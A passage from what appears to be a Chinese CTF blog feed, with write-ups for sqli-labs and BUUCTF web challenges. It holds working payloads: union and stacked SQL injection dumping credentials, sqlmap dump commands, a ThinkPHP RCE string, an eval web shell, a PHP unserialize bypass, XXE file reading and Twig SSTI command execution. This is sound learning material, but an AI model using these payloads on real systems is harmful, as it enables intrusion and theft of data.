Quotes-String<br>GET-双重注入-双重引号-字符串<br>相较于level5，单引号改为双引号<br>测试<code>?id=1&quot; union SELECT null,count(*),concat((select group_concat(schema_name) from information_schema.schemata ),floor(rand()*2))as a from information_schema.tables group by a%23</code>可以正常得到库名     </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>    </p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>GET - Blind - Boolian Based - Single Quotes<br>基于布尔的盲注-单引号<br>测试<code>?id=1&#39; and length(database())&gt;8%23</code>正常      </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>    </p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题005</title>
    <link href="/2021/01/19/BUU005/"/>
    <url>/2021/01/19/BUU005/</url>
    
    <content type="html"><![CDATA[<h2 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h2><ul><li>题目：[极客大挑战 2019]LoveSQL<br> [<img src="https://s1.imagehub.cc/images/2021/01/19/01.md.png">]       </li><li>分析<br>传入<code>username=1&#39;&amp;&amp;password=1&#39;</code>发现报错，所以可以的得出两处均存在sql注入，再次传入<code>username=1&quot;&amp;&amp;password=1&quot;</code>,发现没有报错，而是<code>NO,Wrong username password！！！</code><br>接下来按流程走一走：      <blockquote><p>测试字段数<br>测回显位<br>查询库名<br>查询表名<br>查询列名<br>列中数据       </p></blockquote></li><li>解<br><code>username=1&#39; order by 1,2,3,4#</code> 得到<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code>说明三个字段；<br><code>username=1&#39; union select 1,2,3#</code>得到<a href="https://www.imagehub.cc/image/6jRaH"><img src="https://s1.imagehub.cc/images/2021/01/19/02.md.png" alt="02.md.png"></a><br>说明回显位在2，3处。<br><code>username=1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)#</code>得到所有的库名<a href="https://www.imagehub.cc/image/6ja0Y"><img src="https://s1.imagehub.cc/images/2021/01/19/03.md.png" alt="03.md.png"></a><br><code>username=1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)#</code>获取geek库下的表名<br><a href="https://www.imagehub.cc/image/6jhFc"><img src="https://s1.imagehub.cc/images/2021/01/19/04.md.png" alt="04.md.png"></a><br><code>username=1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;)#</code>获取l0ve1ysq1表下的列名<a href="https://www.imagehub.cc/image/6jBlK"><img src="https://s1.imagehub.cc/images/2021/01/19/05.md.png" alt="05.md.png"></a><br><code>username=1&#39; union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from geek.l0ve1ysq1)#</code>得到flag<br><a href="https://www.imagehub.cc/image/6jUdT"><img src="https://s1.imagehub.cc/images/2021/01/19/06.md.png" alt="06.md.png"></a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leve2</title>
    <link href="/2021/01/18/leve2/"/>
    <url>/2021/01/18/leve2/</url>
    
    <content type="html"><![CDATA[<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><h3 id="用sqlmap过第二关："><a href="#用sqlmap过第二关：" class="headerlink" title="用sqlmap过第二关："></a>用sqlmap过第二关：</h3><ol><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 --dbs</code><br>得到数据库<br><img src="https://ftp.bmp.ovh/imgs/2021/01/e826d7b6614685d0.png"></li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security --tables</code><br>获取<code>security</code>下的表<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f86812760a0593bb.png"></li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users --columns</code><br>获取<code>users</code>表中的列名<br>[<img src="https://s3.ax1x.com/2021/01/18/scp4eI.png">]</li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C password --dump</code><br>获取<code>password</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc99YT.png">]</li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C username --dump</code><br>获取<code>username</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc9ou9.png">]</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题004</title>
    <link href="/2021/01/18/BUU004/"/>
    <url>/2021/01/18/BUU004/</url>
    
    <content type="html"><![CDATA[<h2 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h2><ul><li><p>题目：[SUCTF 2019]EasySQL<br><a href="https://www.imagehub.cc/image/6jbY2"><img src="https://s1.imagehub.cc/images/2021/01/19/0102cc55d08653a98b.md.png" alt="0102cc55d08653a98b.md.png"></a><br>又是挨打的一天，哎       </p></li><li><p>分析<br>试了几下，发现了四种回显，<br><a href="https://www.imagehub.cc/image/6k2K7"><img src="https://s1.imagehub.cc/images/2021/01/19/02a36cac9ad26e6d51.md.png" alt="02a36cac9ad26e6d51.md.png"></a><br><a href="https://www.imagehub.cc/image/6kJG6"><img src="https://s1.imagehub.cc/images/2021/01/19/03c5acdd455142d18f.md.png" alt="03c5acdd455142d18f.md.png"></a><br>第三种输出<code>Nonono</code>;第四种无输出；看到0和1，本来以为是布尔值注入，但弄了半天也没个结果，还是去看WP吧     </p></li><li><p>解<br>原来可以堆叠注入，居然没想到……..<br>然后<code>1;show databases;</code>得到库；<code>1;show tables;</code>得到个Flag表<a href="https://www.imagehub.cc/image/6kPVB"><img src="https://s1.imagehub.cc/images/2021/01/19/046528a57b3736bbb6.md.png" alt="046528a57b3736bbb6.md.png"></a><br><code>1;select * from Flag;</code>发现得不到flag；看WP说是过滤了flag、from等；而且比赛时源码泄露了？？<br>源码：<code>select $_GET[&#39;query&#39;] || flag from flag</code><br>payload1:<code>*,1</code>     </p><p>  payload2:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><p>  得到flag<a href="https://www.imagehub.cc/image/6kcIy"><img src="https://s1.imagehub.cc/images/2021/01/19/058f6f0248c586cc4a.md.png" alt="058f6f0248c586cc4a.md.png"></a>  </p><ul><li><p>知识点</p><p>  在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。</p><p>  但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>  模式：pipes_as_concat 来实现oracle 的一些功能。</p></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level1~~level4</title>
    <link href="/2021/01/17/leve1/"/>
    <url>/2021/01/17/leve1/</url>
    
    <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>输入id=1,有回显；此外，2，3，4……12均有回显，说明有12条数据。</p><p>接下来使用<code>order by 1 %23</code><br><code>order by 1,2 %23</code><br>…….<br>得到一共有三列<br>将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面的显示位。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/7fe5a0b12e1c7810.png"><br>2，3两个显示位；<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23</code> 得到库名<img src="https://ftp.bmp.ovh/imgs/2021/01/e273266cd62bab04.png"><br>获取security库中的表<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) %23</code><img src="https://ftp.bmp.ovh/imgs/2021/01/bff49f0f721798e4.png"><br>users下的列名<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/fd5c32324cb27880.png"></p><p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png">            </p><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>?id=1</code>正常输出<br><code>?id=1&#39;</code>报错<br><code>?id=1&quot;</code>报错<br><code>?id=3-1</code>正常输出<br>判断为数值型注入<br><code>?id=33 union select 1,2,3%23</code>正常回显<br>按第一关的步骤可以得出      </p><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>?id=1&#39;</code>报错<br><code>?id=1&quot;</code>正常输出<br>本来以为是<code>&quot;&quot;</code>的闭合，但后面的操作进行不出来；<br><code>?id=1&#39;)%23</code>也能正常输出<br><code>?id=1&#39;) order by 1,2,3,4%23</code>报错输出<br><code>?id=1&#39;) union select 1,2,3%23</code>正常输出<br>所以应该是<code>(&#39;&#39;)</code>的闭合     </p><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><code>?id=1&#39;</code>正常输出<br><code>?id=1&quot;%23</code>报错<br><code>?id=1&#39;)%23</code>正常输出，但<code>order by 1,2,3,4</code>没有报错<br><code>?id=1&quot;)%23</code>正常输出<br><code>?id=1&quot;) order by 1,2,3,4%23</code>正常报错<br>说明闭合形式为<code>(&quot;&quot;)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>noet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题003</title>
    <link href="/2021/01/17/BUU003/"/>
    <url>/2021/01/17/BUU003/</url>
    
    <content type="html"><![CDATA[<h2 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h2><ul><li><p>题目：[极客大挑战 2019]EasySQL<br>打开网页：<img src="https://ftp.bmp.ovh/imgs/2021/01/e63e9622302a8b1e.png">           </p></li><li><p>分析<br>F12看到源码中有个check.php,访问后也没得到有价值的信息；<br>题目是EasySQL，那就是SQL注入了吧；<br>输入：用户名：1’       密码：1<br>发现报错：<img src="https://ftp.bmp.ovh/imgs/2021/01/3ddef4ddc63b0e86.png"><br>所以应该是字符型注入           </p></li><li><p>解<br><img src="https://ftp.bmp.ovh/imgs/2021/01/06ec27df80b3a0e3.png"><br>得到flag：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0144b5f527675cfb.png"><br>或者使用万能密码：<code>admin&#39; or &#39;1&#39;=&#39;1</code><br>拼接的sql语句为：<code>username=admin&#39; or &#39;1&#39;=&#39;1&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code><br>也可以得到flag。      </p></li><li><p>知识点      </p></li><li><p>*字符型注入**<br>存在SQL注入漏洞的URL参数为字符串类型（需要使用单引号表示）<br>关键在于<strong>单引号闭合</strong><br>mysql数据库对于单引号的规则如下：</p><pre><code>  &gt; 单引号必须成对出现，否则数据库就会报错。              如果两个单引号之间内容为空，数据库自动忽略。</code></pre></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题002</title>
    <link href="/2021/01/16/BUU002/"/>
    <url>/2021/01/16/BUU002/</url>
    
    <content type="html"><![CDATA[<h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><ul><li>题目：[强网杯 2019]随便注<br><img src="https://ftp.bmp.ovh/imgs/2021/01/bf336fcfff0a5cd3.png"></li></ul><ul><li>分析：<br>一道sql注入题，而且select、where等一些词被过滤，不能用，对于一个刚刚接触sql注入的小白来说，完全手足无措，看了一些文章，还是一脸懵，还是去看WP吧，就当积累了。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/853a20efda0e5fef.png"></li><li>解<br>可以使用<strong>堆叠注入</strong>，就是一条sql语句以<code>；</code>结尾后，再加sql语句，还是能执行。<br>查看库：<code>1&#39;;show databases;</code>      得到：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f55691cf3ced64bb.png"><br>查看表：<code>1&#39;;show tables;</code>得到：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/05c3b3fc760f6eca.png"><br>查看表结构：<code>1&#39;;desc `1919810931114514`;</code>值得注意的是，要查询这个表的结构，名字要用反引号包住，否则是不会返回结果的。 </li></ul><p>在windows系统下，反单引号是数据库、表、索引、列和别名用的引用符。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8e40ff5403047887.png"><br>另一个表：<code>1&#39;;desc words;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3fbb9965de0a3b46.png"><br>这个表中有<strong>id</strong>和<strong>data</strong>;所以猜测后台的查询语句可能是：<code>select id,data from words where id =</code></p><p>然后这个改名的方法tql：</p><p>将<code>1919810931114514</code>改为words；原来的words改成其他名字words1；列名flag改成id，然后用<code>1&#39; or 1=1;</code>就能得到flag了。<br><strong>payload：</strong></p><pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/01/7bfbf349a5b321ec.png"></p><ul><li>知识点        <blockquote><p>堆叠注入<br>改名字的语句解析：<br>rename命令用于修改表名。<br>rename命令格式：rename table 原表名 to 新表名;<br>修改原字段名称及类<br><code>mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type;</code></p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shuashua</title>
    <link href="/2021/01/15/shuashua/"/>
    <url>/2021/01/15/shuashua/</url>
    
    <content type="html"><![CDATA[<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><ul><li>题目：<img src="https://ftp.bmp.ovh/imgs/2021/01/5118e8d6dae556ff.png">          </li><li>解<br>摸索了半天，还是没有找到有价值的信息，看了别人的WP后知道原来这是Think PHP的一个远程代码执行漏洞：<blockquote><p> <code>? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxx（命令）</code>           </p></blockquote></li></ul><ul><li>解<br>先<code>ls</code>一下，发现没有flag，去上级目录<code>../</code>多加几个，或者直接到根目录<code>./</code>;得到一个flag名字的文件<br><img src="https://ftp.bmp.ovh/imgs/2021/01/362902231b2d1d1d.png"><br><code>cat ../../../flag</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/5e56a7b6934f2903.png"></li></ul><hr><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><ul><li>题目：<a href="https://www.imagehub.cc/image/6knh1"><img src="https://s1.imagehub.cc/images/2021/01/19/php201.md.png" alt="php201.md.png"></a>        </li><li>解<br>访问<code>index.phps</code>得到源码       <blockquote><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p></blockquote></li></ul><blockquote><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。                 </p></blockquote><p><a href="https://www.imagehub.cc/image/6kd0R"><img src="https://s1.imagehub.cc/images/2021/01/19/PHP202.md.png" alt="PHP202.md.png"></a><br>意思是GET方式的到的id经过url解密后不等于admin，然后$_GET(id)=admin；所以将admin二次url加密，url加密就是ASCII码的十六进制前加个%；二次加密，将%换为%25<br><strong>payload：</strong>?id=%2561dmin<br>得到flag<br><a href="https://www.imagehub.cc/image/6kfFF"><img src="https://s1.imagehub.cc/images/2021/01/19/php203.md.png" alt="php203.md.png"></a>     </p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a><code>Web_php_unserialize</code></h2><pre><code>&lt;?php class Demo &#123;     private $file = &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#39;index.php&#39;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var = base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;       </code></pre><p><code>__wakeup</code>绕过—-改对象属性个数<br><code>/[oc]:\d+:/i</code>—-这个匹配的是<code>o : 4</code>这个整体，加个 <code>+</code>绕过         </p><pre><code>&lt;?phpclass Demo&#123;    private $file=&#39;fl4g.php&#39;;&#125;$a=new Demo();$b=serialize($a);$b = str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$b);//绕过preg_matchecho $b;    echo &quot;&lt;br&gt;&quot;;$b = str_replace(&#39;:1:&#39;, &#39;:2:&#39;,$b);//绕过wakeupecho $b;    echo &quot;&lt;br&gt;&quot;;echo (base64_encode($b));?&gt;       </code></pre><p>结果：         </p><pre><code>O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==          </code></pre><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a><code>[GKCTF2020]CheckIN</code></h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token shell-comment comment">##以Ginkgo传参                  </span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token shell-comment comment">##base64解码</span>                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">##执行</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      </span></code></pre></code></pre><p>先传个phpinfo吧   </p><pre><code>phpinfo();cGhwaW5mbygpOw==  </code></pre><p>发现一些被禁的函数</p><p><img src="https://ftp.bmp.ovh/imgs/2021/02/6f0dd5d7bcae5fd6.png"><br>接下来传个一句话      </p><pre><code>eval($_POST[&#39;123&#39;]);CmV2YWwoJF9QT1NUWycxMjMnXSk7       </code></pre><p>蚁剑连接<br><img src="https://ftp.bmp.ovh/imgs/2021/02/9c14b4dc6443408a.png"><br>根目录下发现<code>flag</code>，但打开是空白<br>还有个<code>readflag</code>要通过这个读取flag         </p><p>一个<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">exploi</a><br>新建一个文件，写入这个，保存，然后用刚才的一句话include一下这个文件就能得到flag了<img src="https://ftp.bmp.ovh/imgs/2021/02/b49d755f776b0ecc.png">           </p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/e122cab0ec2e8bd0.png"><br>题目提示是xml<br>抓包<br>payload：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/02/a247f5074ab04e29.png"><br>知识点：<a href="https://xz.aliyun.com/t/6887#toc-0">xml外部实体注入</a>——&gt;文件读取       </p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/e795df96af35b06c.png"><br>买马<br><code>price=10----------------&gt;Only one char(?) allowed! </code><br>买到第四只马就能得到flag<br>源码有注释``</p><meta charset="utf-8"><!--Ah,really important,seriously. -->``          <pre><code>UTF-8（8位元，Universal Character Set/Unicode         Transformation Format）是针对Unicode的一种可变长度字符编 码。它可以用来表示Unicode标准中的任何字符             </code></pre><p>找一个Unicode字符，其数字大于1337即可<br>网站：<a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a><br>这里我找了个三千的，然后复制提交即可<br><img src="https://ftp.bmp.ovh/imgs/2021/02/4c6a8d395e0c3a62.png"><br><a href="https://xz.aliyun.com/t/5402#toc-0">浅谈Unicode设计的安全性</a>      </p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/3e914a1527e27c01.png"><br>返回49<br><code>&#123;&#123;7*'7'&#125;&#125;</code>  返回也是49<br><code>Twig模板注入 </code>      </p><pre><code>Twig &#123;&#123;7*'7'&#125;&#125;  #输出49Jinja&#123;&#123;7*'7'&#125;&#125;  #输出7777777            </code></pre><p>抓包<br>注入点是cookie的user       </p><p>payload:<code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code>      </p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">MORE</a>      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题001</title>
    <link href="/2021/01/15/BUU001/"/>
    <url>/2021/01/15/BUU001/</url>
    
    <content type="html"><![CDATA[<h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><ul><li>题目： PHP代码审计</li></ul><p>页面一个表情，查看源代码<br><img src="https://ftp.bmp.ovh/imgs/2021/01/6b4ea505386b6788.png"></p><p>访问<code>source.php</code>,得到PHP代码     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">class</span> <span class="token class-name">emmm</span>   <span class="token punctuation">&#123;</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"source.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">//$whitelist有"source.php"和"hint.php"两个字符串</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token comment">//要求$page存在且是字符串</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token comment">//$page中的字符串应该含于$whitelist中</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//截取$page中第一个字符到 ？ 注意mb_strpos函数第一个 ？ 前是个连接符 .</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>            <span class="token comment">//再次比较</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//将$page解码</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//截取</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>       <span class="token comment">//比较</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token 